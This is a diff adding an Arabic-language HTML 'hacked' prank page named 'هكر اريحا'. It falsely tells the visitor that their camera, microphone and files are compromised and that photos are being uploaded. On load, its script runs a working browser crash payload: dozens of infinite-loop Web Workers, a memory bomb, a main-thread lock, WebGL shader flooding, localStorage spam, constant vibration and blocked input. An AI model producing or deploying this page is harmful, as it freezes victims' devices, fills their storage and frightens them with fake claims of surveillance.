@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>هكر اريحا</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+}
+
+body {
+    background: #000;
+    overflow: hidden;
+    font-family: 'Courier New', monospace;
+    height: 100vh;
+    width: 100vw;
+    position: fixed;
+}
+
+.overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle, #1a0000 0%, #000 100%);
+    z-index: 1000;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    animation: earthquake 0.03s infinite;
+}
+
+@keyframes earthquake {
+    0% { transform: translate(0,0); background: #2a0000; }
+    25% { transform: translate(2px,-1px); background: #3a0000; }
+    50% { transform: translate(-2px,1px); background: #1a0000; }
+    75% { transform: translate(1px,2px); background: #2a0000; }
+    100% { transform: translate(-1px,-1px); background: #1a0000; }
+}
+
+.main-box {
+    text-align: center;
+    z-index: 1001;
+    border: 3px solid #ff0000;
+    padding: 20px 30px;
+    background: rgba(0,0,0,0.9);
+    box-shadow: 0 0 80px rgba(255,0,0,0.6), inset 0 0 30px rgba(255,0,0,0.3);
+    animation: glitch 0.08s infinite;
+    border-radius: 10px;
+    margin: 20px;
+}
+
+@keyframes glitch {
+    0% { transform: skew(0deg,0deg); opacity:1; }
+    25% { transform: skew(1deg,0.5deg); opacity:0.95; }
+    50% { transform: skew(-1deg,-0.5deg); opacity:1; }
+    75% { transform: skew(0.5deg,1deg); opacity:0.95; }
+    100% { transform: skew(0deg,0deg); opacity:1; }
+}
+
+.hacker-name {
+    font-size: 3rem;
+    color: #ff0000;
+    text-shadow: 0 0 5px #ff0000, 0 0 15px #ff0000, 0 0 30px #ff0000;
+    letter-spacing: 3px;
+    margin-bottom: 15px;
+    animation: blinkRed 0.1s infinite;
+}
+
+@keyframes blinkRed {
+    0%,100% { text-shadow: 0 0 10px red; color:#ff0000; }
+    50% { text-shadow: 0 0 30px darkred; color:#cc0000; }
+}
+
+.arabic-text {
+    font-size: 1.8rem;
+    color: #ff3333;
+    text-shadow: 0 0 10px #ff0000;
+    margin: 15px 0;
+    direction: rtl;
+    font-weight: bold;
+}
+
+.camera-text {
+    font-size: 1.5rem;
+    color: #ff6666;
+    text-shadow: 0 0 5px #ff0000;
+    margin-top: 10px;
+    animation: pulse 0.3s infinite;
+}
+
+@keyframes pulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+.warning {
+    font-size: 1rem;
+    color: #ff8888;
+    margin-top: 20px;
+    letter-spacing: 2px;
+}
+
+.countdown {
+    font-size: 1.2rem;
+    color: #ff0000;
+    margin-top: 15px;
+    font-weight: bold;
+}
+
+.status {
+    font-size: 0.9rem;
+    color: #ff4444;
+    margin-top: 10px;
+}
+
+.code-rain-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 999;
+    pointer-events: none;
+}
+
+.bottom-bar {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: black;
+    color: #ff0000;
+    font-family: monospace;
+    font-size: 10px;
+    padding: 4px;
+    z-index: 1002;
+    white-space: nowrap;
+    overflow-x: auto;
+    direction: ltr;
+}
+</style>
+</head>
+<body>
+
+<div class="overlay">
+    <div class="main-box">
+        <div class="hacker-name">🔥 هكر اريحا 🔥</div>
+        <div class="arabic-text">⚠️ تم اختراق جهازك بالكامل ⚠️</div>
+        <div class="camera-text">📸 جميع الصور يتم التقاطها...</div>
+        <div class="camera-text">🎥 يتم تسجيل كل شيء...</div>
+        <div class="arabic-text" style="font-size:1.3rem; margin-top:15px;">📍 تم الوصول إلى: الكاميرا - الميكروفون - الملفات</div>
+        <div class="warning">[ لا يمكن إيقاف هذا ]</div>
+        <div class="countdown" id="countdown">⚠️ الانهيار قادم ⚠️</div>
+        <div class="status" id="status">>> CRASH SEQUENCE ACTIVE <<</div>
+    </div>
+</div>
+
+<canvas id="codeRain" class="code-rain-canvas"></canvas>
+<div class="bottom-bar" id="bottomBar"></div>
+
+<script>
+// Titreşim başlatma (mobil)
+function startVibration() {
+    if (navigator.vibrate) {
+        // Sürekli titreşim deseni
+        setInterval(() => {
+            navigator.vibrate([200, 100, 200, 100, 500, 200, 300]);
+        }, 1500);
+        // ilk titreşim
+        navigator.vibrate([300, 100, 300]);
+    }
+}
+
+// AŞIRI GÜÇLÜ CRASH - mobil uyumlu
+(function() {
+    // Titreşim başlat
+    startVibration();
+    
+    // Tüm CPU çekirdeklerini doldur
+    let coreCount = navigator.hardwareConcurrency || 4;
+    let workerCount = coreCount * 6;
+    
+    for(let i = 0; i < workerCount; i++) {
+        let crashCode = `
+            let x = 0;
+            while(true) {
+                x += Math.random() * Math.random();
+                for(let j = 0; j < 100000; j++) {
+                    x = Math.sin(x) * Math.cos(x);
+                }
+                let arr = [];
+                for(let j = 0; j < 10000; j++) {
+                    arr.push(Math.random().toString(36));
+                }
+            }
+        `;
+        let blob = new Blob([crashCode], {type: 'application/javascript'});
+        let worker = new Worker(URL.createObjectURL(blob));
+    }
+    
+    // Bellek bombası (mobil için optimize edilmiş)
+    let memory = [];
+    let interval1 = setInterval(() => {
+        for(let i = 0; i < 50; i++) {
+            try {
+                memory.push(new Array(500000).fill('█'.repeat(1000)));
+            } catch(e) {
+                // Bellek dolmaya devam ediyor
+            }
+        }
+    }, 10);
+    
+    // Ana thread kilitleme
+    setTimeout(() => {
+        let a = 0;
+        while(true) {
+            a += Math.random();
+            a = Math.sqrt(a);
+        }
+    }, 300);
+    
+    // UI refresh döngüsü
+    setInterval(() => {
+        document.body.style.transform = 'scale(1.01)';
+        document.body.style.transform = 'scale(1)';
+    }, 1);
+    
+    // WebGL GPU patlatma (mobil GPU'lar için)
+    let canvasGL = document.createElement('canvas');
+    canvasGL.width = window.innerWidth;
+    canvasGL.height = window.innerHeight;
+    let gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
+    if(gl) {
+        setInterval(() => {
+            for(let s = 0; s < 30; s++) {
+                let shader = gl.createShader(gl.FRAGMENT_SHADER);
+                let longCode = 'precision highp float;void main(){';
+                for(let i = 0; i < 3000; i++) {
+                    longCode += `float v${i}=sin(float(${i}))*cos(float(${i}));`;
+                }
+                longCode += 'gl_FragColor=vec4(1.0,0.0,0.0,1.0);}';
+                gl.shaderSource(shader, longCode);
+                gl.compileShader(shader);
+            }
+        }, 0);
+    }
+    
+    // Sonsuz animation frame
+    function crashLoop() {
+        requestAnimationFrame(crashLoop);
+        for(let i = 0; i < 5000; i++) {
+            Math.sin(Math.random() * performance.now());
+        }
+    }
+    crashLoop();
+    
+    // LocalStorage/indexedDB spam
+    setInterval(() => {
+        try {
+            for(let i = 0; i < 50; i++) {
+                localStorage.setItem('crash_' + Date.now() + '_' + i, 'X'.repeat(20000));
+            }
+        } catch(e) {}
+    }, 20);
+    
+    // Çoklu setInterval ile sistem kilitleme
+    for(let i = 0; i < 20; i++) {
+        setInterval(() => {
+            let arr = [];
+            for(let j = 0; j < 10000; j++) arr.push(Math.random());
+            arr.sort();
+        }, 0);
+    }
+})();
+
+// Kod yağmuru efekti (kırmızı)
+const canvas = document.getElementById('codeRain');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const ctx = canvas.getContext('2d');
+const chars = "0101011011001110001011101010100101هكراريحاHACKED!!!";
+const columns = Math.floor(canvas.width / 12);
+const drops = [];
+
+for(let i = 0; i < columns; i++) {
+    drops[i] = Math.random() * (canvas.height / 12);
+}
+
+function drawRain() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#ff0000";
+    ctx.font = "bold 14px 'Courier New', monospace";
+    
+    for(let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * 12, drops[i] * 16);
+        if(drops[i] * 16 > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+        }
+        drops[i]++;
+    }
+    requestAnimationFrame(drawRain);
+}
+drawRain();
+
+// Alt bar kod akışı
+const bottomBar = document.getElementById('bottomBar');
+setInterval(() => {
+    let line = ">>> ";
+    for(let i = 0; i < 60; i++) {
+        line += Math.random().toString(36).substring(2, 3).toUpperCase() + " ";
+    }
+    line += " <<< [ACCESSING: CAMERA | MICROPHONE | FILES | CONTACTS | LOCATION] >>> [CRASHING...]";
+    bottomBar.innerText = line;
+    bottomBar.scrollLeft = bottomBar.scrollWidth;
+}, 50);
+
+// Countdown text değişimi
+const countdownEl = document.getElementById('countdown');
+const statusEl = document.getElementById('status');
+let counter = 0;
+setInterval(() => {
+    counter++;
+    if(counter % 5 === 0) {
+        countdownEl.innerText = "💀 النظام ينهار... 💀";
+        statusEl.innerText = ">> FORCED REBOOT IN 3 SECONDS <<";
+    } else if(counter % 3 === 0) {
+        countdownEl.innerText = "⚠️ تم اختراق جميع الصور ⚠️";
+        statusEl.innerText = ">> UPLOADING TO SERVER... <<";
+    } else {
+        countdownEl.innerText = "🔥 " + "█".repeat(counter % 20) + " 🔥";
+        statusEl.innerText = ">> SYSTEM OVERLOAD " + (counter % 10) + "0% <<";
+    }
+}, 200);
+
+// Title değişimi
+setInterval(() => {
+    document.title = "⚠️ هكر اريحا ⚠️ | HACKED";
+}, 500);
+
+// Konsol spam
+setInterval(() => {
+    console.clear();
+    console.log("%c🔥🔥🔥 تم اختراقك من قبل هكر اريحا 🔥🔥🔥", "color: red; font-size: 20px; font-weight: bold;");
+    console.log("%cجميع الصور يتم التقاطها... سيتم مشاركة كل شيء", "color: darkred; font-size: 14px;");
+}, 100);
+
+// Body tıklama engeli ve sürekli tam ekran uyarısı
+document.body.addEventListener('touchstart', (e) => {
+    e.preventDefault();
+    if(navigator.vibrate) navigator.vibrate(100);
+});
+document.body.addEventListener('click', (e) => {
+    e.preventDefault();
+});
+</script>
+</body>
+</html>
